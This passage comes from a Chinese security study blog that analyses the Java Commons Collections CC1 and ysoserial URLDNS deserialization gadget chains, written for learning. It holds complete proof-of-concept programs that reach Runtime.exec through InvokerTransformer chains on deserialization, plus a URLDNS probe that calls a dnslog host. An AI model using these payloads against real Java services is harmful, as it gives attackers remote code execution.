alt="image-20211105212302747"></p><p>它的作用就是包装任意一个对象，在执行回调时返回这个对象，进而方便后续操作</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p>这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键</p><p>构造函数，公有的构造啊函数需要三个参数第一是待执行的方法名，第二个参数是函数的参数列表的参数类型，第三个参数就是传递给函数的参数列表。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214619152.png" alt="image-20211105214619152"></p><p>利用反射调用函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105214940329.png" alt="image-20211105214940329"></p><p>测试类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105220944207.png" alt="image-20211105220944207"></p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p>根据名字来看就是将多个<code>Transformer</code>依次调用各自的<code>transform</code>连接起来</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105231814199.png" alt="image-20211105231814199"></p><p>构造函数，需要传入一个<code>Transformer</code>类的数组对象</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105222243124.png" alt="image-20211105222243124"></p><p>测试代码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211105230953256.png" alt="image-20211105230953256"></p><h2 id="TransformedMap-POC"><a href="#TransformedMap-POC" class="headerlink" title="TransformedMap POC"></a>TransformedMap POC</h2><p>对于<code>TransformerMap</code>反序列化时如果需要执行命令，必须调用到<code>put()</code>函数</p><p>主要利用得类是<code>AnnotationInvocationHandler</code>，它是在 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>位置。按照之前的分析，如果要构造利用反序列化链就必须在有重写<code>readObject()</code>并且里面有对<code>Map</code>对象的增加操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211106002037911.png" alt="image-20211106002037911"></p><p>在重写的<code>readObject()</code>中最后一行中的<code>setValue()</code>就刚好可以触发整个链子，所以这样就构成了漏洞。</p><blockquote><p>注意里面的if判断语句</p></blockquote><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, ClassNotFoundException, IOException, InvocationTargetException </span>&#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        inermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = TransformedMap.decorate(inermap, <span class="hljs-keyword">null</span>,transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outermap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行效果如下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107022124421.png" alt="image-20211107022124421"></p><p>这个 POC 中需要注意的点</p><ol><li><code>Runtime</code>类是不能反序列化的，因为它没有扩展反序列化接口，所以需要使用反射来调用执行</li><li>需要注意构造 payload 时还需要注意 <code>inermap.put(&quot;value&quot;, &quot;lcdm123&quot;)</code></li><li>这个只对java的低版本（Java 8u71以前）适用，因为高版本对这个类的<code>readObject()</code>方法做了修改</li></ol><blockquote><p>具体的下面P神代码审计中都讲到了原因，所以就不重复记录浪费时间了</p></blockquote><p>但是在 ysoserial 中的链不是利用的 TransformedMap ，而是利用的 LazyMap，这是为什么呢？</p><p>为什么要先 inermap.put(“value”,”lcdm123”) 呢?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        <span class="hljs-keyword">this</span>.type = var1;<br>        <span class="hljs-keyword">this</span>.memberValues = var2;<br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Entry var5 = (Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>这里我们可以倒着看，要执行到最后的setValue()必须 var7!= null，var7 的来源就是var3.get(var6)，<code>var3 = var2.memberTypes()</code>， <code>var2 = AnnotationType.getInstance(this.type)</code>，</p><p>var6 就是获取到 HashMap 的 key 值。</p><p>追踪一下 var2,会获取我们注解的基本信息(Target)，this.type为之前我们传入的注解</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211125162017969.png" alt="image-20211125162017969"></p><p>var3会获取var2中的Membertypes中的数值，即<code>&#123;value=class [Ljava.lang.annotation.ElementType;&#125;</code></p><ol><li>传入的注解需要存在memberTypes(即要存在注解元素名)</li></ol><blockquote><p>对于注解还需要单独去学习一下，这里还不是理解后的一点</p></blockquote><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并且继承了 AbstractMapDecorator。</p><p>LazyMap 和 TransformedMap 的唯一差别就是，TransformedMap 是写入元素时执行 transform 而 LazyMap 是在使用 get 方法中执行 factory.transform。LazyMap 的作用就是懒加载，在 get 不到值的时候，它会调用 factory.transform 方法去获取一个值</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107142042883.png" alt="image-20211107142042883"></p><p>同样是利用到了AnnotationInvocationHandler类，但是它的 readObject() 方法中没有利用到 get 方法，但是在它的 invoke 方法中调用了 get，所以在 ysoserial 中利用了对象代理的方法调用到 invoke。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107150456447.png" alt="image-20211107150456447"></p><p>动态代理之前的学习笔记：<a href="http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/">http://lcdm123.xyz/2021/10/19/Java%E4%BB%A3%E7%90%86/</a></p><p>这里先写了一个 Map 的代理类，这个代理类实现的 invoke 方法中检测到如果调用 get 方法就会执行自定义的内容。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107154521318.png" alt="image-20211107154521318"></p><p>通过这样的方法就可以调用到 invoke 方法中的get()方法。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107155236632.png" alt="image-20211107155236632"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br><br>        Map inermap = <span class="hljs-keyword">new</span> HashMap();<br>        Transformer transformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map outermap = LazyMap.decorate(inermap, transformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, outermap);<br><br>        Map proxymap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,<br>                handler);<br>        handler = (InvocationHandler) cons.newInstance(Retention.class, proxymap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream =  <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个POC和上面的差比不大，只是改动了一些地方，并且使用了 java 的代理机制触发了整条链子</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107163204792.png" alt="image-20211107163204792"></p><p>这里的重点还是对于 java 代理机制的熟练理解与使用</p><p>参考文章</p><p><a href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/117279811">https://y4tacker.blog.csdn.net/article/details/117279811</a></p><p><a href="https://ego00.blog.csdn.net/article/details/119701408">https://ego00.blog.csdn.net/article/details/119701408</a></p><p>p神代码审计</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java URLDNS反序列化链</title>
    <link href="/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <url>/2021/11/08/Java-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Ysoserial-URLDNS链分析"><a href="#Ysoserial-URLDNS链分析" class="headerlink" title="Ysoserial URLDNS链分析"></a>Ysoserial URLDNS链分析</h1><p>Java 反序列化三要素: readObject()反序列化利用点 + 反序列化链 + RCE触发点</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>ysoserial 中的 URLDNS 链 </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103132646400.png" alt="image-20211103132646400"></p><p>配置运行一下程序</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190638779.png" alt="image-20211103190638779"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103190728640.png" alt="image-20211103190728640"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里是另外一个师傅写的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//0x01.生成payload</span><br>        <span class="hljs-comment">//设置一个hashMap</span><br>        HashMap&lt;URL, String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;URL, String&gt;();<br>        <span class="hljs-comment">//设置我们可以接受DNS查询的地址http://</span><br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://qu7ljs.dnslog.cn&quot;</span>);<br>        <span class="hljs-comment">//将URL的hashCode字段设置为允许修改</span><br>        Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span><br>        <span class="hljs-comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span><br>        f.set(url, <span class="hljs-number">0xdeadbeef</span>);<br>        <span class="hljs-comment">//2. 将url放入hashMap中，右边参数随便写</span><br>        hashMap.put(url, <span class="hljs-string">&quot;rmb122&quot;</span>);<br>        <span class="hljs-comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span><br>        f.set(url, -<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//0x02.写入文件模拟网络传输</span><br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        oos.writeObject(hashMap);<br>        <span class="hljs-comment">//0x03.读取文件，进行反序列化触发payload</span><br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;out.ser&quot;</span>));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103223717961.png" alt="image-20211103223717961"></p><p>先对测试代码就行简单的理解，首先是定义了一个 <code>HashMap</code> 对象，键值分别为 <code>URL</code> 和 <code>String</code>，之后利用了反射原理获取到了权限去修改 <code>URL</code> 对象的私有成员变量 <code>HashCode</code> 值（<code>HashCode</code> 的默认值是 -1），分别更改了两次值，最后执行了一下序列化与反序列化操作。</p><p>Java 反序列化的漏洞点应该是重写后的 <code>readObject()</code> 方法所以看看序列化<code>HashMap</code>类的 <code>readObject()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>    s.defaultReadObject();<br>    reinitialize();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                         mappings);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>        <span class="hljs-comment">// Size the table using given load factor only if within</span><br>        <span class="hljs-comment">// range of 0.25...4.0</span><br>        <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>        <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>        <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>        table = tab;<br><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                K key = (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                V value = (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233814772.png" alt="image-20211103233814772"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103233852218.png" alt="image-20211103233852218"></p><blockquote><p>上面的 key 就是 URL类</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211103234020569.png" alt="image-20211103234020569"></p><blockquote><p>上面的 handler 就是 URLStreamHandler</p></blockquote><p> <img src="https://gitee.com/lcdm123/image/raw/master/image-20211103234442107.png" alt="image-20211103234442107"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211104003706260.png" alt="image-20211104003706260"></p><p>最后执行到 <code>getHostAddress()</code> 就调用到<code>getByName()</code>来根据主机名获取IP地址，在网络上就是执行一次 DNS 